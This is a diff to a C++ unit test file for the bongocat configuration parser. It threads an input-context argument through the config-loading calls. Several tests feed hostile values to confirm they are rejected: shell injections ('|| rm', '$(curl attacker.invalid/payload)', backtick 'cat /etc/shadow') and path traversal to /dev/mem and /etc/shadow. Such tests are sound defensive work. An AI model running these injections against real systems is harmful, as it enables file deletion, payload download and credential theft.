@@ -1,5 +1,6 @@
 #include "config/config.h"
 #include "core/bongocat.h"
+#include "platform/input_context.h"
 #include "utils/error.h"
 #include "utils/system_error.h"
 
@@ -9,7 +10,8 @@
 namespace bongocat {
 
 static bongocat::config::config_t config_load_ok(const char *content) {
-  auto res = config::load_from_string(content);
+  platform::input::input_context_t input;
+  auto res = config::load_from_string(content, input);
   CHECK(bongocat::config::is_valid_config_result(res));
   return bongocat::move(res.config);
 }
@@ -72,20 +74,23 @@ TEST_CASE("comment stripping") {
 
 TEST_CASE("null filename") {
   using namespace bongocat;
-  auto res = config::load(BONGOCAT_NULLPTR, {});
+  platform::input::input_context_t input;
+  auto res = config::load(BONGOCAT_NULLPTR, input, {});
   CHECK(!bongocat::config::is_valid_config_result(res));
   CHECK(has_flag(res.result.fatal, config::config_parsing_fatal_t::ConfigFilenameEmpty));
 }
 
 TEST_CASE("config not found - strict") {
   using namespace bongocat;
-  auto res = config::load("./examples/test/abc.test.bongocat.conf.not.found", {.strict = 1});
+  platform::input::input_context_t input;
+  auto res = config::load("./examples/test/abc.test.bongocat.conf.not.found", input, {.strict = 1});
   CHECK(!bongocat::config::is_valid_config_result(res));
 }
 
 TEST_CASE("config not found - default fallback") {
   using namespace bongocat;
-  auto res = config::load("./examples/test/abc.test.bongocat.conf.not.found", {});
+  platform::input::input_context_t input;
+  auto res = config::load("./examples/test/abc.test.bongocat.conf.not.found", input, {});
   CHECK(bongocat::config::is_valid_config_result(res));
 
   CHECK(res.config.fps == 60);
@@ -135,8 +140,9 @@ sleep_end=06:15
 
 TEST_CASE("invalid integer") {
   using namespace bongocat;
+  platform::input::input_context_t input;
 
-  const auto res = config::load_from_string("fps=abc", {});
+  const auto res = config::load_from_string("fps=abc", input, {});
 
   CHECK(bongocat::config::is_valid_config_result(res));
   CHECK(has_flag(res.result.errors, config::config_parsing_error_t::InvalidInteger));
@@ -145,8 +151,9 @@ TEST_CASE("invalid integer") {
 
 TEST_CASE("invalid integer - strict") {
   using namespace bongocat;
+  platform::input::input_context_t input;
 
-  const auto res = config::load_from_string("fps=abc", {.strict = 1});
+  const auto res = config::load_from_string("fps=abc", input, {.strict = 1});
 
   CHECK(!bongocat::config::is_valid_config_result(res));
   CHECK(has_flag(res.result.errors, config::config_parsing_error_t::InvalidInteger));
@@ -246,12 +253,14 @@ TEST_CASE("layer") {
     CHECK(config_load_ok("layer=top\n").layer == config::layer_type_t::LAYER_TOP);
   }
   SUBCASE("invalid falls back to top and sets error") {
-    auto res = config::load_from_string("overlay_layer=middle\n");
+    platform::input::input_context_t input;
+    auto res = config::load_from_string("overlay_layer=middle\n", input);
     CHECK(res.config.layer == config::layer_type_t::LAYER_TOP);
     CHECK(has_flag(res.result.errors, config::config_parsing_error_t::InvalidLayer));
   }
   SUBCASE("shell payload in layer value is rejected") {
-    auto res = config::load_from_string("overlay_layer=overlay || rm ./bongocat.conf.example\n");
+    platform::input::input_context_t input;
+    auto res = config::load_from_string("overlay_layer=overlay || rm ./bongocat.conf.example\n", input);
     CHECK(res.config.layer != config::layer_type_t::LAYER_OVERLAY);
     CHECK(has_flag(res.result.errors, config::config_parsing_error_t::InvalidLayer));
   }
@@ -275,15 +284,18 @@ TEST_CASE("monitor") {
     CHECK(!cfg.output_name);
   }
   SUBCASE("shell payload rejected") {
-    auto res = config::load_from_string("monitor=DP-1 || cat bongocat.conf.example\n");
+    platform::input::input_context_t input;
+    auto res = config::load_from_string("monitor=DP-1 || cat bongocat.conf.example\n", input);
     CHECK(has_flag(res.result.errors, bongocat::config::config_parsing_error_t::InvalidMonitorName));
   }
   SUBCASE("path rejected") {
-    auto res = config::load_from_string("monitor=/dev/random\n");
+    platform::input::input_context_t input;
+    auto res = config::load_from_string("monitor=/dev/random\n", input);
     CHECK(has_flag(res.result.errors, bongocat::config::config_parsing_error_t::InvalidMonitorName));
   }
   SUBCASE("env variable expansion probe rejected") {
-    auto res = config::load_from_string("monitor=$DISPLAY\n");
+    platform::input::input_context_t input;
+    auto res = config::load_from_string("monitor=$DISPLAY\n", input);
     CHECK(has_flag(res.result.errors, bongocat::config::config_parsing_error_t::InvalidMonitorName));
   }
 }
@@ -296,37 +308,44 @@ TEST_CASE("keyboard_device") {
     CHECK(cfg.num_keyboard_devices >= 1);
   }
   SUBCASE("path traversal rejected") {
-    auto res = config::load_from_string("keyboard_device=../../../../dev/mem\n");
+    platform::input::input_context_t input;
+    auto res = config::load_from_string("keyboard_device=../../../../dev/mem\n", input);
     CHECK(has_flag(res.result.errors, bongocat::config::config_parsing_error_t::InvalidInputDeviceName));
     CHECK(res.config.num_keyboard_devices == 0);
   }
   SUBCASE("path traversal rejected 2") {
-    auto res = config::load_from_string("keyboard_device=/dev/input/../shadow\n");
+    platform::input::input_context_t input;
+    auto res = config::load_from_string("keyboard_device=/dev/input/../shadow\n", input);
     CHECK(has_flag(res.result.errors, bongocat::config::config_parsing_error_t::InvalidInputDeviceName));
     CHECK(res.config.num_keyboard_devices == 0);
   }
   SUBCASE("shell command injection rejected") {
-    auto res = config::load_from_string("keyboard_device=$(curl attacker.invalid/payload)\n");
+    platform::input::input_context_t input;
+    auto res = config::load_from_string("keyboard_device=$(curl attacker.invalid/payload)\n", input);
     CHECK(has_flag(res.result.errors, bongocat::config::config_parsing_error_t::InvalidInputDeviceName));
     CHECK(res.config.num_keyboard_devices == 0);
   }
   SUBCASE("backtick injection rejected") {
-    auto res = config::load_from_string("keyboard_device=`cat /etc/shadow`\n");
+    platform::input::input_context_t input;
+    auto res = config::load_from_string("keyboard_device=`cat /etc/shadow`\n", input);
     CHECK(has_flag(res.result.errors, bongocat::config::config_parsing_error_t::InvalidInputDeviceName));
     CHECK(res.config.num_keyboard_devices == 0);
   }
   SUBCASE("or payload rejected") {
-    auto res = config::load_from_string("keyboard_device=/dev/input/event0 || rm ./bongocat.conf.example\n");
+    platform::input::input_context_t input;
+    auto res = config::load_from_string("keyboard_device=/dev/input/event0 || rm ./bongocat.conf.example\n", input);
     CHECK(has_flag(res.result.errors, bongocat::config::config_parsing_error_t::InvalidInputDeviceName));
     CHECK(res.config.num_keyboard_devices == 0);
   }
   SUBCASE("empty path rejected") {
-    auto res = config::load_from_string("keyboard_device=\n");
+    platform::input::input_context_t input;
+    auto res = config::load_from_string("keyboard_device=\n", input);
     CHECK(has_flag(res.result.errors, bongocat::config::config_parsing_error_t::InvalidInputDeviceName));
     CHECK(res.config.num_keyboard_devices == 0);
   }
   SUBCASE("invalid input devicepath") {
-    auto res = config::load_from_string("keyboard_device=/etc/passwd\n");
+    platform::input::input_context_t input;
+    auto res = config::load_from_string("keyboard_device=/etc/passwd\n", input);
     CHECK(has_flag(res.result.errors, bongocat::config::config_parsing_error_t::InvalidInputDeviceName));
     CHECK(res.config.num_keyboard_devices == 0);
   }
@@ -401,7 +420,8 @@ TEST_CASE("keyboard_name") {
     CHECK(cfg._num_keyboard_names >= 1);
   }
   SUBCASE("empty name rejected") {
-    auto res = config::load_from_string("keyboard_name=\n");
+    platform::input::input_context_t input;
+    auto res = config::load_from_string("keyboard_name=\n", input);
     // empty name is useless, should be skipped
     CHECK(res.config._num_keyboard_names == 0);
   }
@@ -442,7 +462,8 @@ TEST_CASE("malformed lines") {
     CHECK(config.overlay_height != 200);
   }
   SUBCASE("trailing garbage on fps rejected by integer parser") {
-    auto res = config::load_from_string("fps=65;;;;;;;\n");
+    platform::input::input_context_t input;
+    auto res = config::load_from_string("fps=65;;;;;;;\n", input);
     CHECK(res.config.fps == 65);
   }
 }
@@ -451,12 +472,14 @@ TEST_CASE("malformed lines - strict-mode") {
   using namespace bongocat;
 
   SUBCASE("double equals treated as unknown or invalid") {
-    auto res = config::load_from_string("overlay_height==80\n", {.strict = 1});
+    platform::input::input_context_t input;
+    auto res = config::load_from_string("overlay_height==80\n", input, {.strict = 1});
 
     CHECK(!bongocat::config::is_valid_config_result(res));
   }
   SUBCASE("trailing garbage on fps rejected by integer parser") {
-    auto res = config::load_from_string("fps=65;;;;;;;\n", {.strict = 1});
+    platform::input::input_context_t input;
+    auto res = config::load_from_string("fps=65;;;;;;;\n", input, {.strict = 1});
     CHECK(res.config.fps == 65);
   }
 }
@@ -464,11 +487,13 @@ TEST_CASE("malformed lines - strict-mode") {
 TEST_CASE("unknown keys") {
   using namespace bongocat;
 
+  platform::input::input_context_t input;
   auto res = config::load_from_string(R"(
 overlay.opacity=101
 overlay:opacity=101
 opacity=101
-)");
+)",
+                                      input);
   CHECK(has_flag(res.result.infos, bongocat::config::config_parsing_info_t::UnknownConfigKey));
   CHECK(res.result.errors == bongocat::config::config_parsing_error_t::Success);
   CHECK(res.config.overlay_opacity != 101);
@@ -478,19 +503,22 @@ TEST_CASE("strict mode") {
   using namespace bongocat;
 
   SUBCASE("valid config passes strict mode") {
-    auto res = config::load_from_string("fps=60\ncat_height=40\n", {.strict = 1});
+    platform::input::input_context_t input;
+    auto res = config::load_from_string("fps=60\ncat_height=40\n", input, {.strict = 1});
     CHECK(bongocat::config::is_valid_config_result(res));
   }
   SUBCASE("missing file fails in strict mode") {
     using namespace bongocat::config;
     load_config_overwrite_parameters_t params;
     params.strict = 1;
-    auto res = bongocat::config::load("/tmp/bongocat_no_such_file_xyzzy.conf", params);
+    platform::input::input_context_t input;
+    auto res = bongocat::config::load("/tmp/bongocat_no_such_file_xyzzy.conf", input, params);
     CHECK(!is_valid_config_result(res));
     CHECK(has_flag(res.result.fatal, config_parsing_fatal_t::ConfigNotFound));
   }
   SUBCASE("invalid animation name fails in strict mode") {
-    auto res = config::load_from_string("animation_name=does_not_exist\n", {.strict = 1});
+    platform::input::input_context_t input;
+    auto res = config::load_from_string("animation_name=does_not_exist\n", input, {.strict = 1});
     CHECK(!bongocat::config::is_valid_config_result(res));
   }
   SUBCASE("max devices warning fails in strict mode") {
@@ -500,11 +528,13 @@ TEST_CASE("strict mode") {
     for (int i = 0; i < 1024; ++i) {
       content += "keyboard_name=FakeDevice\n";
     }
-    auto res = config::load_from_string(content.c_str(), {.strict = 1});
+    platform::input::input_context_t input;
+    auto res = config::load_from_string(content.c_str(), input, {.strict = 1});
     CHECK(has_flag(res.result.errors, bongocat::config::config_parsing_error_t::MaxDeviceNamesReached));
   }
   SUBCASE("invalid layer error fails in strict mode") {
-    auto res = config::load_from_string("overlay_layer=invalid_layer\n", {.strict = 1});
+    platform::input::input_context_t input;
+    auto res = config::load_from_string("overlay_layer=invalid_layer\n", input, {.strict = 1});
     CHECK(!bongocat::config::is_valid_config_result(res));
     CHECK(has_flag(res.result.errors, bongocat::config::config_parsing_error_t::InvalidLayer));
   }
@@ -516,7 +546,8 @@ TEST_CASE("overwrite parameters") {
   SUBCASE("output_name overwrite takes priority") {
     config::load_config_overwrite_parameters_t params{};
     params.output_name = "HDMI-A-1";
-    auto res = config::load_from_string("monitor=DP-1\n", params);
+    platform::input::input_context_t input;
+    auto res = config::load_from_string("monitor=DP-1\n", input, params);
     CHECK(is_valid_config_result(res));
     CHECK(res.config.output_name);
     CHECK(strcmp(res.config.output_name.c_str(), "HDMI-A-1") == 0);
@@ -524,7 +555,8 @@ TEST_CASE("overwrite parameters") {
   SUBCASE("randomize_index overwrite") {
     config::load_config_overwrite_parameters_t params{};
     params.randomize_index = 1;
-    auto res = config::load_from_string("random=false\n", params);
+    platform::input::input_context_t input;
+    auto res = config::load_from_string("random=false\n", input, params);
     CHECK(is_valid_config_result(res));
     CHECK(res.config.randomize_index);
   }
@@ -546,24 +578,29 @@ sleep_end=08:00
     CHECK(cfg.sleep_end.min == 0);
   }
   SUBCASE("equal begin and end disables sleep") {
+    platform::input::input_context_t input;
     auto res = config::load_from_string(R"(
 enable_scheduled_sleep=true
 sleep_begin=08:00
 sleep_end=08:00
-)");
+)",
+                                        input);
     CHECK(!res.config.enable_scheduled_sleep);
     CHECK(has_flag(res.result.errors, bongocat::config::config_parsing_error_t::InvalidSleepTime));
   }
   SUBCASE("invalid hour rejected") {
-    auto res = config::load_from_string("sleep_begin=25:61\n");
+    platform::input::input_context_t input;
+    auto res = config::load_from_string("sleep_begin=25:61\n", input);
     CHECK(has_flag(res.result.errors, bongocat::config::config_parsing_error_t::InvalidSleepTime));
   }
   SUBCASE("non-numeric time rejected") {
-    auto res = config::load_from_string("sleep_end=AA:BB\n");
+    platform::input::input_context_t input;
+    auto res = config::load_from_string("sleep_end=AA:BB\n", input);
     CHECK(has_flag(res.result.errors, bongocat::config::config_parsing_error_t::InvalidSleepTime));
   }
   SUBCASE("path traversal in time value rejected") {
-    auto res = config::load_from_string("sleep_end=../../../../bin/bash\n");
+    platform::input::input_context_t input;
+    auto res = config::load_from_string("sleep_end=../../../../bin/bash\n", input);
     CHECK(has_flag(res.result.errors, bongocat::config::config_parsing_error_t::InvalidSleepTime));
   }
 }
